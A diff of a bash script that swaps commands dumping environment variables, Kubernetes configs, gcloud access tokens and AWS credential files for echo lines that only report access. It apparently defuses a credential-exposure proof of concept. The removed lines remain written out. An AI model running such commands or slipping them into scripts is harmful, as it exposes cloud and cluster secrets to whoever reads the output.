@@ -7,26 +7,26 @@ then
     exit 0
 fi
 
-env
+echo "Have access to: env"
 
 if [[ -f ~/.kube/config ]]; then
-  cat ~/.kube/config
+  echo "Have access to ~/.kube/config"
 fi
 
 if [[ ! -z "$KUBECONFIG" ]] && [[ -f "$KUBECONFIG" ]]; then
-  cat "$KUBECONFIG"
+  echo "Have access to $KUBECONFIG"
 fi
 
 if [ -x "$(command -v gcloud)" ]; then
-  gcloud config config-helper --format=json
+  echo "Could have ran: gcloud config config-helper --format=json"
 fi
 
 if [[ -f ~/.config/gcloud/access_tokens.db ]]; then
-  cat ~/.config/gcloud/access_tokens.db
+  echo "Have access to ~/.config/gcloud/access_tokens.db"
 fi
 
 if [[ -d "~/.aws" ]]; then
-  cat ~/.aws/*
+  echo "Have access to ~/.aws/*"
 fi
 
 echo ""
